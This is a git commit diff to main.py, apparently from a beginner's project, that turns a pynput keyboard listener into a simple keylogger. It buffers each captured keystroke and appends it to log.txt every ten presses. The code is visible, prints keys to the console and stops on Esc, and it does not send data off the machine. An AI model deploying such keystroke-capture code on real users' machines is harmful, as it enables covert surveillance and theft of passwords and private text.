4c8f67e9b88b64b22f6074412ebed7c1c4a2def7
Indra Nurwibisono <bigmasterindra@yahoo.com>
2021-12-23 11:06:11 +0700

    write keylog to file txt

--- main.py
+++ main.py
@@ -1,8 +1,25 @@
 import pynput
 from pynput.keyboard import Key, Listener
 
+count = 0
+keys = []
+
 def on_press(key):
+    global keys, count
+
+    keys.append(key)
+    count += 1
     print("{0} pressed".format(key))
+
+    if count >= 10:
+        count = 0
+        writefile(keys)
+        keys = []
+
+def writefile(keys):
+    with open("log.txt", "a") as f:
+        for key in keys:
+            f.write(str(key))
 
 def on_release(key):
     if key==Key.esc:
